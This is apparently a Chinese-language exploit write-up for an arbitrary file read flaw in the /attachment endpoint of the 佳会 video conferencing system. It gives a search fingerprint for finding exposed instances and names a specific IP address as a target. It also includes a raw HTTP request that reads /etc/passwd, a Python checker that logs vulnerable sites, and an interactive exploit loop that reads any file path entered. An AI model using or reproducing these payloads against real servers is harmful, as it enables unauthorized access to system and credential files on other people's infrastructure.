# 佳会视频会议attachment接口存在任意文件读取漏洞

## 一、资产搜索

```
body="/user/get_app_scheme?site_id="
```

## 二、网站测试

```
 https://47.96.78.168:11000
```

## 三、验证漏洞

构造的数据包

```
GET /attachment?file=/etc/passwd HTTP/1.1
Host: 47.96.78.168:11000
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-CN;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
```

![image-20240903213002256](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903213002256.png)

## 四、POC

```
def poc(target):
    payload = "/attachment?file=/etc/passwd"
    res1 = requests.get(target,verify=False)
    try:
        if res1.status_code == 200:
            res2 = requests.get(target+payload,verify=False)
            if "root" in res2.text:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    return True
                print(f"该网站[+]{target}存在任意文件读取漏洞")
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞")
        else:
            print("访问超时，请重试")
    except Exception as e:
        print(e)
```

## 五、EXP

```
    while True:
        payload = "/attachment?file="
        content = input("请输入要查看的文件，从/目录开始输入(q退出)\n>>>>>>>>>>>>>>>>")
        if content == "q":
            exit()
        res1 = requests.get(target, verify=False)
        if res1.status_code == 200:
            res2 = requests.get(target + payload + content, verify=False)
            if "DOCTYPE" in res2.text:
                print(f"文件不存在")
            else:
                print(res2.text)
```

## 六、测试结果

![image-20240903213735883](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903213735883.png)

![image-20240903213833603](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903213833603.png)